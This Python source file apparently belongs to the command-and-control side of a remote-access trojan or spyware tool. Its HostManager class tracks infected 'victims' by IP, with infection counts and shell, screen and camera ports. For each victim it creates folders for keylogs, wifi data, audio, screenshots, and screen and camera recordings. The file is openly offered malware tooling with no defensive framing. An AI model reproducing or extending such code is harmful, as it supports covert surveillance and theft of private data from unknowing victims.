import json
import os
from datetime import datetime

class HostManager:
    def __init__(self, filename="connected_hosts.json"):
        self.filename = filename
        self.base_dir = "victims_data"  # Base directory for all victim data
        self.hosts = self.load_hosts()
        # Create base directory if it doesn't exist
        if not os.path.exists(self.base_dir):
            os.makedirs(self.base_dir)

    def load_hosts(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

    def create_victim_folder(self, ip):
        """Create folder structure for a new victim"""
        victim_dir = os.path.join(self.base_dir, ip.replace('.', '_'))
        if not os.path.exists(victim_dir):
            os.makedirs(victim_dir)
            # Create subfolders for different types of data
            os.makedirs(os.path.join(victim_dir, 'keylog'), exist_ok=True)
            os.makedirs(os.path.join(victim_dir, 'wifi'), exist_ok=True)
            os.makedirs(os.path.join(victim_dir, 'audio'), exist_ok=True)
            os.makedirs(os.path.join(victim_dir, 'screenshots'), exist_ok=True)
            os.makedirs(os.path.join(victim_dir, 'videos'), exist_ok=True)  # Add videos folder
            os.makedirs(os.path.join(victim_dir, 'videos', 'screen'), exist_ok=True)  # Subfolder for screen recordings
            os.makedirs(os.path.join(victim_dir, 'videos', 'camera'), exist_ok=True)  # Subfolder for camera recordings
        return victim_dir

    def get_victim_folder(self, ip):
        """Get the folder path for a specific victim"""
        return os.path.join(self.base_dir, ip.replace('.', '_'))

    def add_host(self, ip, ports=None):
        """Add or update a host with additional information"""
        if ports is None:
            ports = {
                'shell': 5000,
                'screen': 5001,
                'camera': 5002
            }

        # Create folder structure for new victim
        victim_dir = self.create_victim_folder(ip)

        self.hosts[ip] = {
            'ip': ip,
            'ports': ports,
            'first_seen': self.hosts.get(ip, {}).get('first_seen', datetime.now().isoformat()),
            'last_seen': datetime.now().isoformat(),
            'status': 'Reachable',
            'infection_count': self.hosts.get(ip, {}).get('infection_count', 0) + 1,
            'data_dir': victim_dir
        }
        self.save_hosts()

    def update_host_status(self, ip, status):
        """Update host status and last seen time"""
        if ip in self.hosts:
            self.hosts[ip]['status'] = status
            self.hosts[ip]['last_seen'] = datetime.now().isoformat()
            self.save_hosts()

    def remove_host(self, ip):
        """Remove a host from tracking"""
        if ip in self.hosts:
            del self.hosts[ip]
            self.save_hosts()

    def get_hosts(self):
        """Get list of all host IPs"""
        return list(self.hosts.keys())

    def get_host_info(self, ip):
        """Get detailed information about a specific host"""
        return self.hosts.get(ip, None)

    def get_active_hosts(self):
        """Get list of currently active hosts"""
        return [ip for ip, info in self.hosts.items() if info['status'] == 'Reachable']

    def save_hosts(self):
        """Save hosts data to file"""
        with open(self.filename, 'w') as f:
            json.dump(self.hosts, f, indent=4) 